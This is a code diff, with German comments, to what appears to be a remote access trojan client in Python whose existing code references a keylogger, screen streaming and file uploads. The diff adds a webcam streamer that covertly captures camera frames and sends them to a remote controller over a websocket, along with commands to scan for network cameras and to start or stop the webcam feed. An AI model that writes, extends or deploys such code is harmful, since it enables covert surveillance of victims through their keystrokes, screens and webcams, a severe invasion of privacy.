@@ -21,6 +21,7 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.backends import default_backend
 import tempfile
+import threading
 
 # pynput wird für den Keylogger benötigt
 try:
@@ -421,6 +422,58 @@ class ScreenStreamer:
 
 screen_streamer = ScreenStreamer()
 
+class WebcamStreamer:
+    def __init__(self):
+        self._task = None
+        self._running = False
+        self._ws = None
+        self._fps = 5
+
+    async def start(self, ws):
+        if self._running:
+            return
+        self._running = True
+        self._ws = ws
+        self._task = asyncio.create_task(self._stream())
+
+    async def stop(self):
+        self._running = False
+        if self._task:
+            self._task.cancel()
+            try:
+                await self._task
+            except Exception:
+                pass
+            self._task = None
+
+    async def _stream(self):
+        try:
+            import cv2
+            import base64
+            import asyncio
+            cam = cv2.VideoCapture(0)
+            if not cam.isOpened():
+                await self._ws.send(json.dumps({"type": "command_output", "output": "Webcam konnte nicht geöffnet werden"}))
+                return
+            while self._running:
+                ret, frame = cam.read()
+                if not ret:
+                    await self._ws.send(json.dumps({"type": "command_output", "output": "Kein Bild von Webcam erhalten"}))
+                    break
+                _, buf = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
+                b64img = base64.b64encode(buf.tobytes()).decode("utf-8")
+                meta = {"action": "webcam_frame"}
+                await self._ws.send(json.dumps(meta))
+                await self._ws.send(b64img)
+                await asyncio.sleep(1 / self._fps)
+            cam.release()
+        except ImportError:
+            await self._ws.send(json.dumps({"type": "command_output", "output": "cv2 nicht installiert"}))
+        except Exception as e:
+            await self._ws.send(json.dumps({"type": "command_output", "output": f"Webcam Fehler: {e}"}))
+
+webcam_streamer = WebcamStreamer()
+
 # --- Hauptlogik ---
 # --- Chunked Upload State ---
 CHUNKED_UPLOADS = {}
@@ -613,6 +666,23 @@ async def process_commands(websocket):
                     # Optional: Fortschritt melden
                     response = {"type": "debug", "msg": f"Chunk {chunk_index+1}/{total_chunks} empfangen für {filename}"}
                     await websocket.send(json.dumps(response))
+                continue
+            elif action == "scan_cameras":
+                # Netzwerk-Kameras suchen
+                cams = scan_network_cameras()
+                response["type"] = "command_output"
+                response["output"] = "Gefundene Netzwerk-Kameras:\n" + ("\n".join(cams) if cams else "Keine gefunden.")
+            elif action == "webcam_start":
+                await webcam_streamer.start(websocket)
+                response["type"] = "command_output"
+                response["output"] = "Webcam-Streaming gestartet."
+                await websocket.send(json.dumps(response))
+                continue
+            elif action == "webcam_stop":
+                await webcam_streamer.stop()
+                response["type"] = "command_output"
+                response["output"] = "Webcam-Streaming gestoppt."
+                await websocket.send(json.dumps(response))
                 continue
             else:
                 response["status"] = "error"
